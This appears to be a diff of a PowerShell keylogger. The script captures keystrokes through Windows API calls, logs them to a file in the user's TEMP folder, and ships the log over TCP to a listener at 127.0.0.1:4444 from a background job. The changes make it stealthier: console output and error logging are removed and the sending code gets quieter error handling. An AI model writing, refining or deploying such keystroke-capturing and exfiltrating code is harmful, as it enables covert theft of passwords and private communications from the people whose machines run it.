@@ -23,7 +23,7 @@ Function Main-Run {
 		Add-Type -MemberDefinition $Sig3 -Name GetKBS -Namespace PsOneApi
 		Add-Type -MemberDefinition $Sig4 -Name ToUni -Namespace PsOneApi
 
-		$file = ".\out.txt"
+		$file = Join-Path -Path $env:TEMP -ChildPath "out.txt"
 		$buffer = 10
 		
 		while($true){
@@ -39,16 +39,14 @@ Function Main-Run {
 					$t_char = New-Object -TypeName System.Text.StringBuilder
 					$uni_operation = [PsOneApi.ToUni]::ToUnicode($key_num,$vk,$kb,$t_char,$t_char.Capacity,0)
 					if ($uni_operation){
-						Write-Host $uni_operation $t_char
 						Add-Content -Path $file -Value $t_char -NoNewLine
 					}
 					$length = (Get-Item $file).Length
 					
 					if ($length -gt $buffer){
 						if ($job -and $job.State -eq "Running") {
-							Write-Host "Job is still running"
-							Receive-Job -Job $job
 						} else {
+							Remove-Job -Job $job
 							$job = Start-Job -ScriptBlock{
 								Function Send-TCPMessage {
 									Param ( 
@@ -57,30 +55,31 @@ Function Main-Run {
 										[Parameter(Mandatory=$true, Position=2)][string] $Message
 									) 
 									Process {
-										$Address = [System.Net.IPAddress]::Parse($IP) 
-										$Socket = New-Object System.Net.Sockets.TCPClient($Address,$Port) 
-										$Stream = $Socket.GetStream() 
-										$Writer = New-Object System.IO.StreamWriter($Stream)
-										$Message | % {
-											$Writer.WriteLine($_)
-											$Writer.Flush()
+										try{
+											$Address = [System.Net.IPAddress]::Parse($IP) 
+											$Socket = New-Object System.Net.Sockets.TCPClient($Address,$Port) 
+											$Stream = $Socket.GetStream() 
+											$Writer = New-Object System.IO.StreamWriter($Stream)
+											$Message | % {
+												$Writer.WriteLine($_)
+												$Writer.Flush()
+											}
+											$Stream.Close()
+											$Socket.Close()
+											return $true
 										}
-										$Stream.Close()
-										$Socket.Close()
+										catch{
+											return $false
+										}
 									}
 								}
 								$ret_addr = "127.0.0.1"
 								$ret_port = 4444
-								$file = ".\out.txt"
+								$file = Join-Path -Path $env:TEMP -ChildPath "out.txt"
 								$content = [System.IO.File]::ReadAllText($file)
-								try{
-									Send-TCPMessage -IP $ret_addr -Port $ret_port -Message $content
+								$success = Send-TCPMessage -IP $ret_addr -Port $ret_port -Message $content
+								if ($success){
 									Set-Content -Path $file -Value ""
-									exit
-								}
-								catch{
-									$_ | Out-File ".\error.log"
-									exit
 								}
 							}
 						}
